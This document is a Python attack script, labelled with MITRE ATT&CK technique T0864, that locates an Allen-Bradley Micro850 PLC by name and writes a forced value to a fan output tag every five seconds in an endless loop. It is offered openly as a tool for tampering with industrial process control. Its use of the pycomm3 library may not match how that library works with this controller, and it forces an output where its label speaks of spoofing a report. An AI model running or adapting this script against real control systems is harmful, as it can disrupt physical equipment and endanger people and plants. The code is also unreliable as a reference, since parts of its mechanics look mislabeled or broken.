import pycomm3
import time
import socket

# MITRE ATT&CK Technique: Impair Process Control - Spoof Reporting Message (T0864)

# Configuration
PLC_CONTROLLER_NAME = 'MyMicro850'  # Replace with the actual name of your Micro850 controller
TARGET_TAG = '_IO_EM_DO_02' # Output tag controlling the fan (Spoof its value)
SPOOFED_VALUE = False # Value to spoof (opposite of current)
UPDATE_INTERVAL = 5  # Seconds between spoofing attempts

def get_plc_ip_address(controller_name):
    """
    Finds the IP address of the PLC using its controller name.

    Args:
        controller_name (str): The name of the PLC controller.

    Returns:
        str: The IP address of the PLC, or None if not found.
    """
    try:
        with pycomm3.Discover() as discover:
            devices = discover.list()
            for device in devices:
                if device.get('HostName') == controller_name:
                    return device.get('IPAddress')
            return None  # Device not found
    except Exception as e:
        print(f"Error during discovery: {e}")
        return None

def spoof_tag_value(plc_ip, tag_name, spoofed_value):
    """
    Connects to the PLC, reads the current tag value, and writes the spoofed value.

    Args:
        plc_ip (str): The IP address of the PLC.
        tag_name (str): The name of the tag to spoof.
        spoofed_value (bool): The value to write to the tag.
    """
    try:
        with pycomm3.LogixDriver(plc_ip) as plc:
            # Read the current value (optional, for verification)
            read_response = plc.read(tag_name)
            if read_response.status == 'Success':
                current_value = read_response.value
                print(f"Current value of {tag_name}: {current_value}")

                # Write the spoofed value
                write_response = plc.write(tag_name, spoofed_value)
                if write_response.status == 'Success':
                    print(f"Successfully spoofed {tag_name} to {spoofed_value}")
                else:
                    print(f"Error writing to {tag_name}: {write_response.status}")

                # Verify the spoofed value (optional)
                read_response_after_write = plc.read(tag_name)
                if read_response_after_write.status == 'Success':
                    new_value = read_response_after_write.value
                    print(f"New value of {tag_name}: {new_value}")
                else:
                    print(f"Error reading {tag_name} after write: {read_response_after_write.status}")

            else:
                print(f"Error reading {tag_name}: {read_response.status}")

    except Exception as e:
        print(f"Error communicating with PLC: {e}")


if __name__ == "__main__":
    # 1. Get PLC IP Address
    plc_ip = get_plc_ip_address(PLC_CONTROLLER_NAME)

    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")

        # 2. Spoof Reporting Message in a Loop
        try:
            while True:
                spoof_tag_value(plc_ip, TARGET_TAG, SPOOFED_VALUE)
                time.sleep(UPDATE_INTERVAL)

        except KeyboardInterrupt:
            print("Spoofing stopped by user.")

    else:
        print(f"Could not find PLC with controller name: {PLC_CONTROLLER_NAME}")